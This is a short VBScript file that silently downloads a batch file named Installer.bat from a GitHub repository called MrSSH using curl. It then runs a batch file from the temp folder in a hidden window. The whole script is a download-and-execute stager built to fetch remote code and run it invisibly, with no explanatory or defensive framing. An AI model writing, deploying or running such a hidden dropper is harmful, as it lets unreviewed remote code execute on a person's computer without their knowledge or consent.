Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "curl https://raw.githubusercontent.com/dh3b/MrSSH/main/FIles/Installer.bat -o Installer.bat" & Chr(34), 0
WshShell.Run chr(34) & "%temp%\Installer.bat" & Chr(34), 0
Set WshShell = Nothing
